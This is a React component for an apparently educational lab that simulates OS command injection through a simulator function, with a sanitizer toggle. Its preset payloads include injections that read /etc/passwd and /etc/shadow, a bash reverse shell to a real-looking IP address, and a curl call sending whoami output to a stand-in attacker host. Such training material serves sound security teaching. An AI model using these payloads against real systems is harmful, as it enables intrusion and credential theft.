import { GenericLab } from './GenericLab'
import { simulateCmdInjection } from '../../utils/simulators/cmdInjectionSimulator'
import { useI18n } from '../../i18n'

export function CmdInjectionLab() {
  const { locale } = useI18n()
  const isRu = locale === 'ru'
  return (
    <GenericLab
      config={{
        vulnType: 'OS Command Injection',
        defaultPayload: '127.0.0.1; cat /etc/passwd',
        payloadLabel: isRu ? 'Параметр (например, ping host)' : 'Parameter (e.g. ping host)',
        inputSize: 'short',
        defaultScenario: { sanitized: false },
        scenarioControls: [
          { type: 'toggle', key: 'sanitized', label: isRu ? 'sanitizer активен' : 'sanitizer active' }
        ],
        presets: [
          { id: 'passwd', title: 'cat /etc/passwd', payload: '127.0.0.1; cat /etc/passwd' },
          { id: 'id', title: 'whoami', payload: '127.0.0.1 && id' },
          { id: 'rev', title: 'reverse shell (bash)', payload: '127.0.0.1; bash -i >& /dev/tcp/5.182.211.99/4444 0>&1' },
          { id: 'oob', title: 'blind OOB curl', payload: "127.0.0.1; curl http://attacker.tld/$(whoami)" },
          { id: 'sub', title: '$(…) substitution', payload: '127.0.0.1$(cat /etc/shadow)' },
          { id: 'newline', title: 'newline injection', payload: '127.0.0.1%0acat%20/etc/passwd' }
        ],
        simulate: (payload, scenario, loc) => simulateCmdInjection(payload, scenario, loc)
      }}
    />
  )
}
